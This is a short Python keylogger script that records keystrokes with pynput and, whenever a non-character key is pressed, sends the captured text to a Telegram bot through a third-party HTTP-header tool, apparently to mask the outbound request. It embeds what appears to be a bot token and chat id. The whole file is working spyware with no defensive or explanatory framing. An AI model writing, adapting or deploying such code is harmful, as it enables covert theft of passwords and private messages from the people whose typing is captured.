import requests
from pynput import keyboard

def send_message(word):
    url = 'https://api.telegram.org/"7711566157:AAEs2eaKEVqE5pWYLc9L4WiDIc8vS5n83hw"/sendmessage?chat_id="5709299213"&text='+word

    data = {'UrlBox':url,
        'AgentList':'Mozila Firefox',
        'VersionsList':'HTTP/1.1',
        'MethodList':'GET'
    }

    http_requests = requests.post('https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx' , data)

def listener():
    with keyboard.Listener(on_press= keyboard_log) as lstn:
        lstn.join()

list_of_words = []
def keyboard_log(key):
    
    final_string = ''

    try:
        key = key.char
        list_of_words.append(key)
    
    except:
        for i in list_of_words:
            final_string += i
        
        send_message(final_string)
        #print('this is final string:', final_string)
        list_of_words.clear()



listener()
keyboard_log(list_of_words)
